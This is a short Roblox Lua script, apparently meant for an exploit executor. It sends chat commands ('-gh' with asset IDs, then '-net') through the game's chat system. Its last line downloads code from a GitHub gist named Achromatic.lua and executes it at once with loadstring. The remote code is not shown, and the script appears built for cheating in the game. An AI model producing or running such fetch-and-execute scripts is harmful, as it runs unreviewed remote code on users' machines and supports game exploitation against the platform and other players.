local TextChatService = game:GetService("TextChatService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Players = game:GetService("Players")

local function SendChatMessage(message)
    if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
        local textChannels = TextChatService:FindFirstChild("TextChannels")
        if textChannels then
            local rbxSystem = textChannels:FindFirstChild("RBXSystem")
            if rbxSystem then
                rbxSystem:SendAsync(message)
                return
            end
            local rbxGeneral = textChannels:FindFirstChild("RBXGeneral")
            if rbxGeneral then
                rbxGeneral:SendAsync(message)
                return
            end
        end
        warn("No suitable text channel found!")
    else
        local sayMessageRequest = ReplicatedStorage:FindFirstChild("DefaultChatSystemChatEvents") and ReplicatedStorage.DefaultChatSystemChatEvents:FindFirstChild("SayMessageRequest")
        if sayMessageRequest then
            sayMessageRequest:FireServer(message, "All")
        else
            local player = Players.LocalPlayer
            if player and player:FindFirstChild("Chat") then
                player:Chat(message)
            else
                warn("Legacy chat system not found!")
            end
        end
    end
end

local customMessage = "-gh 14255528083 17374846953 17374851733 17401151565 17387616772 4506945409 4458601937 4794315940 4315489767"
local netMessage = "-net"

SendChatMessage(customMessage)
SendChatMessage(netMessage)

task.wait(0.2)

loadstring(game:HttpGet("https://gist.githubusercontent.com/MelonsStuff/1e606bc885a3c12fd50bc8f29ae6ac49/raw/6f2e187cc59818d2a308bdd055ae2a93bf2fcb64/Achromatic.lua"))()